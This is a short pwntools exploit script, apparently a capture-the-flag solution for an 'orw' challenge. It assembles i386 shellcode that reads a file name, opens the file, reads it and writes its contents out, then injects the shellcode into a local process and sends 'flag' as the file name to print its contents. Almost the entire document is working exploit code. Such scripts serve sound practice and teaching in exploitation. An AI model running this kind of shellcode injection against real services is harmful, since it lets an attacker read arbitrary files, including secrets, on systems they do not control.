from pwn import *
context.arch = 'i386'

io = process('./orw')
io.recvuntil(':')

#read(0,file_name,0x10);
#fd = open(file_name,0,0);
#len = read(fd,buf,0x20);
#write(1,buf,len);

shellXXX='''
mov eax, 3 
xor ebx, ebx 
mov ecx, 0x804a100 
mov edx, 0x10 
int 0x80 
mov eax, 5 
mov ebx, ecx 
xor ecx, ecx 
xor edx, edx 
int 0x80
mov ebx, eax 
mov eax, 3 
mov ecx, 0x804a200 
mov edx, 0x20 
int 0x80
mov ebx, 1  
mov edx, eax
mov eax, 4
int 0x80
ret
'''
craftXXX = asm(shellXXX)
print shellXXX,len(craftXXX),'\n',disasm(craftXXX)
io.send(craftXXX)
io.send('flag\x00')
print io.recv()
